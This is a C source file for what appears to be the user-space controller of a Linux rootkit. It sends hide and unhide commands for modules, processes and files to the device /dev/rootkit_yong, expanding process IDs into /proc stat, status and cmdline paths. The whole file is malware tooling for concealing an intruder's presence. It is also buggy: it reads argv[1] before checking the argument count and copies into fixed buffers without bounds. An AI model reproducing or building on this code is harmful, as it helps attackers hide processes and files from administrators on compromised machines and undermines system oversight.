#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define CMD_CNT 6
#define MAX_ARG_LEN 128

enum { INVAL_CMD, INVAL_ARG, DEV_OPEN_FAIL };

const char* command_list[CMD_CNT] = {
	"hide-module",
	"hide-proc",
	"hide-file",
	"unhide-module",
	"unhide-proc",
	"unhide-file"
};

const char* temp_list[3] = {
	"/stat",
	"/status",
	"/cmdline"
};

void print_err(int errno) {
	printf("Wrong command line argument!\n");
	return;
}

int main(int argc, char* argv[]) {
	int ret, fd, i, error = 1;
	char message[MAX_ARG_LEN] = {0};
	char temp[MAX_ARG_LEN] = {0};

	for (i = 0; i < CMD_CNT; i++) {
		if (strcmp(command_list[i], argv[1]) == 0) {
			error = 0;
		}
	}

	if (error) {
		print_err(INVAL_CMD);
		return -1;
	}

	if (argc != 3) {
		if (strcmp(argv[1], "hide-module") == 0 || strcmp(argv[1], "unhide-module") == 0)
			;
		else {
			print_err(INVAL_ARG);
			return -1;
		}
	}

	fd = open("/dev/rootkit_yong", O_RDWR);
	if(fd < 0)
	{
		print_err(DEV_OPEN_FAIL);
		return -1;
	}

	strcpy(message, argv[1]);
	strcat(message, " ");

	/*
	if (argc == 3) {
		if (strcmp(argv[1], "hide-proc") == 0 || strcmp(argv[1], "unhide-proc") == 0)
			strcat(message, "/proc/");
		strcat(message, argv[2]);
	}

	ret = write(fd, message, 128);
	if (ret < 0)
	{
		printf("device write[1] failure!\n");
		return -1;
	}
	*/

	if (strcmp(argv[1], "hide-proc") == 0 || strcmp(argv[1], "unhide-proc") == 0) {
		strcat(message, "/proc/");
		strcat(message, argv[2]);

		for (i = 0; i < 3; i++) {
			strcpy(temp, message);
			strcat(temp, temp_list[i]);
			write(fd, temp, MAX_ARG_LEN);
		}
	}

	return 0;
}

